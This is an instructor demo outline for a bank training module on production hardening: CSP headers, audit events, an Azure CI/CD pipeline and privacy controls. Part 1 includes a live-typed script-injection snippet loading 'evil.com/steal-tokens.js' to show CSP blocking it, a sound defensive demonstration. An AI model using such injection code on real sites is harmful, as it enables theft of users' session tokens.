# Level 7 — Production: Instructor Demo Outline

> **EastWest Bank — Digital Platforms & Innovations**
>
> Duration: 15-20 minutes

---

## Demo Overview

Walk through the production deployment pipeline and security hardening for the EWB internal banking portal. Show how security headers, compliance controls, and CI/CD work together.

---

## Part 1 — CSP and Security Headers (5 min)

### What to show

1. Open the deployed staging site in Chrome DevTools → Network tab
2. Click on the document request, scroll to Response Headers
3. Point out each security header and explain its purpose:
   - `Content-Security-Policy` — call out `script-src 'self'` (no inline scripts)
   - `X-Frame-Options: DENY` — prevent clickjacking
   - `X-Content-Type-Options: nosniff` — prevent MIME sniffing

### What to type live

Open the browser console and demonstrate CSP enforcement:

```js
// This will be blocked by CSP
const script = document.createElement('script');
script.src = 'https://evil.com/steal-tokens.js';
document.head.appendChild(script);
// Show the CSP violation error in the console
```

### Talking points

- CSP is your last line of defense if XSS bypasses React's escaping
- `frame-ancestors 'none'` prevents the entire banking app from being embedded in an attacker's iframe
- The `Report-Only` mode during development helps identify violations before enforcing

---

## Part 2 — Audit Trail in Action (4 min)

### What to show

1. Open `src/compliance/audit-service.ts`
2. Walk through the `emitAuditEvent` function — highlight `navigator.sendBeacon`
3. Open the browser console in dev mode, trigger a login
4. Show the `[AUDIT] AUTH_LOGIN_SUCCESS` console output
5. Trigger a transfer and show the audit events: `TRANSFER_INITIATE`, `TRANSFER_CONFIRM`

### Talking points

- Every financial operation emits an audit event — this is BSP 1019
- `sendBeacon` ensures events are sent even if the user closes the tab mid-transfer
- The frontend emits events; the backend makes them tamper-proof
- During a BSP examination, you show the audit trail as evidence of controls

---

## Part 3 — CI/CD Pipeline Walkthrough (5 min)

### What to show

1. Open `azure-pipelines.yml` in the editor
2. Walk through the stages: QualityGates → Build → DeployStaging → DeployProduction
3. Show the parallel jobs in QualityGates (lint, type-check, unit tests, E2E run simultaneously)
4. Highlight the `condition` on DeployStaging (`develop` branch) and DeployProduction (`main` branch)
5. Show the Azure DevOps Environments approval gate (screenshot or live if available)

### What to emphasize

- No manual steps in the deployment — everything is automated after approval
- The approval gate is a SOX requirement — no code reaches production without sign-off
- Blue-green deployment: show the diagram with Azure Front Door switching between Blue and Green storage accounts
- Rollback is instant — switch Front Door's backend origin back to the previous storage account

---

## Part 4 — Data Privacy Controls (4 min)

### What to show

1. Open the consent management component — show the toggle switches
2. Demonstrate that "Essential Banking Services" cannot be disabled
3. Toggle an optional consent and show the audit event firing
4. Open the data masking utility — show how account numbers are masked: `••••••7890`
5. Click "Show" to reveal the full number, then "Hide" to re-mask

### Talking points

- DPA requires explicit, granular consent — not a single "I agree" checkbox
- AMLA means full data deletion is not possible — the UI must communicate this
- PII is masked by default; the user chooses when to reveal it
- The `MaskedValue` component is reusable across the entire application

---

## Key Takeaways to Reinforce

1. Security headers are configured in Nginx (for SPA) or `next.config.ts` (for Next.js) — not in application code
2. Every BSP circular maps to specific frontend controls with documented evidence
3. The CI/CD pipeline is the single path to production — no SSH, no manual uploads
4. Consent and privacy are not optional features — they are regulatory requirements with real consequences

---

*EastWest Bank Digital Platforms & Innovations | Confidential*
